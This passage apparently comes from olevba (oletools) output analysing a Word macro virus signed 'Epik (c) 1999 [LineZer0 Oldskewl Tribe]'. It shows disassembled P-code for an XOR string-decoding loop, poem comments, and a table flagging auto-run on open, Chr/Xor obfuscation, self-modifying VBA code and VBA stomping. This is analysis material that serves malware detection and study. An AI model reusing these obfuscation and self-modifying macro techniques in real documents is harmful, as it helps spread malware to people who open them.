' 	Ld s 
' 	FnLen 
' 	For 
' 	BoS 0x0000 
' 	Ld c 
' 	Ld s 
' 	Ld y 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld k 
' 	Xor 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St c 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' 	BoS 0x0000 
' 	EndFunc 
' Line #48:
' 	FuncDefn (Private Sub Epik())
' Line #49:
' 	QuoteRem 0x0000 0x0023 "Caress the needle brink in my eyes,"
' Line #50:
' 	QuoteRem 0x0000 0x0019 "the tears felt like rain."
' Line #51:
' 	QuoteRem 0x0000 0x0023 "I watch the darkness hit the tides,"
' Line #52:
' 	QuoteRem 0x0000 0x0010 "and I'm dying..."
' Line #53:
' 	QuoteRem 0x0000 0x0000 ""
' Line #54:
' 	QuoteRem 0x0000 0x0027 "Epik (c) 1999 [LineZer0 Oldskewl Tribe]"
' Line #55:
' 	QuoteRem 0x0000 0x0030 "Hit the road jack, don't you come back...no more"
' Line #56:
' 	EndSub 
' Line #57:
' 	QuoteRem 0x0000 0x0003 "236"
' Line #58:
' 	QuoteRem 0x0000 0x0000 ""
' Line #59:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

